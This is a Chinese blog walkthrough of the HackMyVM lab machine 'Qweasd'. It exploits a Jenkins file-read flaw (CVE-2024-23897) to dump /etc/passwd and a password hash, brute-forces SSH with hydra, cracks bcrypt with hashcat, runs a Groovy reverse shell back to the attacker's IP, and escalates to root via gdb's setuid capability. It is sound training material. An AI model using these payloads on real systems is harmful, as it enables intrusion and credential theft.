<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://7r1umph.top/css/primer.css' rel='stylesheet' />
    <link href='https://7r1umph.top/css/matrix.css' rel='stylesheet' /><script src='https://7r1umph.top/plugins/theme.js'></script><script src='https://7r1umph.top/plugins/StatsSidebar.js'></script>
    <link rel="icon" href="https://7r1umph.top/image/20250320200557660.ico">
<meta name="description" content="# hmv_qweasd

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Qweasd
**难度**：黄色
**目标 IP**：192.168.205.217
**本机** IP：192.168.205.141

---

## **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.217
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 11:35 CST
Nmap scan report for 192.168.205.217
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Jetty 10.0.18
MAC Address: 08:00:27:75:04:B0 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
                                                                 
```

扫描结果显示目标机器开放了 22 (SSH) 、 80 (HTTP)。">
<meta property="og:title" content="hmv_qweasd">
<meta property="og:description" content="# hmv_qweasd

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Qweasd
**难度**：黄色
**目标 IP**：192.168.205.217
**本机** IP：192.168.205.141

---

## **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.217
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 11:35 CST
Nmap scan report for 192.168.205.217
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Jetty 10.0.18
MAC Address: 08:00:27:75:04:B0 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
                                                                 
```

扫描结果显示目标机器开放了 22 (SSH) 、 80 (HTTP)。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_qweasd.html">
<meta property="og:image" content="https://7r1umph.top/image/202506121404919.webp">
<title>hmv_qweasd</title>



</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}

</style>




<body>
    <div id="header">
<h1 class="postTitle">hmv_qweasd</h1>
<div class="title-right">
    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/34" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><h1>hmv_qweasd</h1>
<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=Qweasd" rel="nofollow">https://hackmyvm.eu/machines/machine.php?vm=Qweasd</a><br>
<strong>难度</strong>：黄色<br>
<strong>目标 IP</strong>：192.168.205.217<br>
<strong>本机</strong> IP：192.168.205.141</p>
<hr>
<h2><strong>1. 端口枚举及服务探测</strong></h2>
<p>首先，使用 <code class="notranslate">nmap</code> 扫描目标 IP 的开放端口：</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.217
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 11:35 CST
Nmap scan report for 192.168.205.217
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Jetty 10.0.18
MAC Address: 08:00:27:75:04:B0 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
                                                                 
</code></pre>
<p>扫描结果显示目标机器开放了 22 (SSH) 、 80 (HTTP)。</p>
<h2><strong>2. Web 服务探测与任意文件读取</strong></h2>
<p>对 80 端口感兴趣，访问 Web 页面。访问有点慢，发现它在加载<code class="notranslate">192.168.5.32:8080</code>的东西，我们先给他禁了</p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/cf4ca609-e74a-46f2-9298-addc5931cf52"><img src="https://github.com/user-attachments/assets/cf4ca609-e74a-46f2-9298-addc5931cf52" alt="image" style="max-width: 100%;"></a></p>
<p>上去在people看到有两个用户，<code class="notranslate">anonymous</code>和<code class="notranslate">an0ma1</code></p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e794228c-5f00-417e-a444-4a99ff39139a"><img src="https://github.com/user-attachments/assets/e794228c-5f00-417e-a444-4a99ff39139a" alt="image" style="max-width: 100%;"></a></p>
<div>
<br>
</div>
<p>扫描一下站点的架构</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ searchsploit Jenkins 2.441  
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Jenkins 2.441 - Local File Inclusion                                                                 | java/webapps/51993.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

</code></pre>
<p>有一个任意文件读取漏洞，你们可以用这个POC但是我感觉<a href="https://github.com/godylockz/CVE-2024-23897">这个</a>更好用，我就用这个了</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ git clone https://github.com/godylockz/CVE-2024-23897.git                     
正克隆到 'CVE-2024-23897'...
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 4 (delta 0), reused 4 (delta 0), pack-reused 0 (from 0)
接收对象中: 100% (4/4), 完成.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cd CVE-2024-23897 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ ls    
jenkins_fileread.py  README.md
                                     
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ python3 jenkins_fileread.py -u http://192.168.205.217:8080
Welcome to the Jenkins file-read shell. Type help or ? to list commands.

file&gt; /etc/passwd
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
penetration:x:1001:1001::/home/penetration:/bin/bash
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
kali:x:1000:1000:asd:/home/kali:/bin/bash
root:x:0:0:root:/root:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
games:x:5:60:games:/usr/games:/usr/sbin/nologin
                      
</code></pre>
<p>用户是<code class="notranslate">kali</code>、<code class="notranslate">penetration</code>、<code class="notranslate">root</code></p>
<p>然后有两个<strong>玩法</strong></p>
<h3>方法一：</h3>
<p>直接拿用户爆破ssh</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
└─$ cat user                                                                                        
kali
penetration
root

┌──(kali㉿kali)-[~]
└─$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.217 -f -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-31 12:44:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 15000 login tries (l:3/p:5000), ~235 tries per task
[DATA] attacking ssh://192.168.205.217:22/
[22][ssh] host: 192.168.205.217   login: kali   password: asdfgh
[STATUS] attack finished for 192.168.205.217 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-31 12:45:43

</code></pre>
<p>拿到<code class="notranslate">kali</code>的密码直接登录，你就会发现<code class="notranslate">sudo</code>可以直接执行任意软件<code class="notranslate">bash -p</code>就是root了，这种应该不是正确的打开方式。</p>
<h3>方法二：</h3>
<p>拿任意读取读用户帐户密码然后使用<code class="notranslate">jenkins</code>弹反弹shell，但是<code class="notranslate">jenkins</code>的路径我没有找到，我纯属马后炮，哈哈哈</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ python3 jenkins_fileread.py -u http://192.168.205.217:8080\
Welcome to the Jenkins file-read shell. Type help or ? to list commands.

file&gt; /home/penetration/users/users.xml
File does not exist
file&gt; /home/penetration/.jenkins/users/users.xml
&lt;?xml version='1.1' encoding='UTF-8'?&gt;
  &lt;idToDirectoryNameMap class=
    &lt;entry&gt;
      &lt;string&gt;an0ma1_6703692303677686036&lt;/string&gt;
  &lt;version&gt;1&lt;/version&gt;
      &lt;string&gt;an0ma1&lt;/string&gt;
&lt;/hudson.model.UserIdMapper&gt;
  &lt;/idToDirectoryNameMap&gt;
&lt;hudson.model.UserIdMapper&gt;
    &lt;/entry&gt;
file&gt; /home/penetration/.jenkins/users/an0ma1_6703692303677686036/config.xml
&lt;hudson.search.UserSearchProperty&gt;
      &lt;roles&gt;
    &lt;jenkins.security.seed.UserSeedProperty&gt;
    &lt;/hudson.search.UserSearchProperty&gt;
      &lt;/tokenStore&gt;
  &lt;properties&gt;
      &lt;flags/&gt;
    &lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;
    &lt;hudson.model.MyViewsProperty&gt;
&lt;/user&gt;
  &lt;id&gt;an0ma1&lt;/id&gt;
    &lt;/jenkins.security.ApiTokenProperty&gt;
      &lt;views&gt;
    &lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=
        &lt;string&gt;authenticated&lt;/string&gt;
&lt;user&gt;
          &lt;name&gt;all&lt;/name&gt;
      &lt;collapsed/&gt;
    &lt;/jenkins.security.seed.UserSeedProperty&gt;
    &lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=
    &lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;
    &lt;/hudson.model.MyViewsProperty&gt;
      &lt;domainCredentialsMap class=
      &lt;triggers/&gt;
          &lt;filterQueue&gt;false&lt;/filterQueue&gt;
      &lt;passwordHash&gt;#jbcrypt:$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76&lt;/passwordHash&gt;
      &lt;/views&gt;
    &lt;jenkins.security.ApiTokenProperty&gt;
    &lt;/hudson.model.PaneStatusProperties&gt;
    &lt;/hudson.tasks.Mailer_-UserProperty&gt;
      &lt;emailAddress&gt;1594743209@qq.com&lt;/emailAddress&gt;
    &lt;jenkins.console.ConsoleUrlProviderUserProperty/&gt;
        &lt;tokenList/&gt;
        &lt;/hudson.model.AllView&gt;
    &lt;/hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty&gt;
          &lt;owner class=
  &lt;/properties&gt;
      &lt;timestamp&gt;1712972655377&lt;/timestamp&gt;
    &lt;hudson.model.TimeZoneProperty/&gt;
    &lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
    &lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;
      &lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;
    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
          &lt;properties class=
        &lt;hudson.model.AllView&gt;
    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
      &lt;seed&gt;e9885566be638620&lt;/seed&gt;
      &lt;providerId&gt;default&lt;/providerId&gt;
    &lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
      &lt;/roles&gt;
    &lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;
    &lt;hudson.model.PaneStatusProperties&gt;
    &lt;hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=
&lt;?xml version='1.1' encoding='UTF-8'?&gt;
  &lt;version&gt;10&lt;/version&gt;
    &lt;hudson.tasks.Mailer_-UserProperty plugin=
          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;
      &lt;tokenStore&gt;
    &lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin=
  &lt;fullName&gt;Mike&lt;/fullName&gt;

</code></pre>
<p><code class="notranslate">#jbcrypt:10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76</code>用户的hash，破解一下</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ echo '$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76' &gt; hash                                  
                                                                                                                                     
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-AMD Ryzen 9 7940H w/ Radeon 780M Graphics, 6925/13914 MB (2048 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?               

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76:369258
                                                        
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZ...smGm76
Time.Started.....: Tue Dec 31 12:59:17 2024 (30 secs)
Time.Estimated...: Tue Dec 31 12:59:47 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      172 H/s (7.45ms) @ Accel:12 Loops:8 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5040/14344385 (0.04%)
Rejected.........: 0/5040 (0.00%)
Restore.Point....: 4896/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: FUCKYOU -&gt; twisted
Hardware.Mon.#1..: Util: 75%

Started: Tue Dec 31 12:59:13 2024
Stopped: Tue Dec 31 12:59:49 2024
                                                         
</code></pre>
<p>然后登上去弹个shell回来</p>
<p>Manage Jenkins --&gt; Script Console</p>
<p>Groovy的反弹shell，我的是这样的</p>
<pre lang="bash" class="notranslate"><code class="notranslate">String host="192.168.205.141";int port=8888;String cmd="bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
</code></pre>
<p>回来了</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ nc -lvnp 8888        
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.217] 51832
id
uid=1001(penetration) gid=1001(penetration) groups=1001(penetration)

</code></pre>
<h2>3.<strong>获得稳定 shell</strong></h2>
<p>获得交互式 TTY shell：</p>
<pre lang="bash" class="notranslate"><code class="notranslate">script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
</code></pre>
<h2>4.提取</h2>
<pre lang="bash" class="notranslate"><code class="notranslate">penetration@asd:/opt$ id
uid=1001(penetration) gid=1001(penetration) groups=1001(penetration)
penetration@asd:/opt$ sudo -l
Matching Defaults entries for penetration on asd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User penetration may run the following commands on asd:
    (ALL) NOPASSWD: /opt/babyGift/vuln

penetration@asd:/opt$ /sbin/getcap -r / 2&gt;/dev/null
/snap/core20/2264/usr/bin/ping cap_net_raw=ep
/snap/core20/2434/usr/bin/ping cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/gdb cap_setuid=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep

</code></pre>
<p>有个<code class="notranslate">/usr/bin/gdb cap_setuid=ep</code>可以<code class="notranslate">Capabilities</code>可以利用</p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c8a29b20-614e-42b1-a4a0-9ddce4ec068d"><img src="https://github.com/user-attachments/assets/c8a29b20-614e-42b1-a4a0-9ddce4ec068d" alt="image" style="max-width: 100%;"></a></p>
<pre lang="bash" class="notranslate"><code class="notranslate">penetration@asd:/opt$ /usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
GNU gdb (Ubuntu 13.1-2ubuntu2.1) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# id
uid=0(root) gid=1001(penetration) groups=1001(penetration)
</code></pre></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Triumph Blog</a></div>
<div id="footer2">
    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML=now.getFullYear();

if(""!=""){
    var startSite=new Date("");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
}
</script></div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
var utterancesLoad=0;

console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);



function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
    script.setAttribute("issue-term","title");
    
    script.setAttribute("theme","github-light");
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}



</script>
</script><script src='https://7r1umph.top/plugins/TOC.js'></script><script src='https://7r1umph.top/plugins/lightbox.js'></script><script src='https://7r1umph.top/plugins/LazyLoadImages.js'></script>

</html>
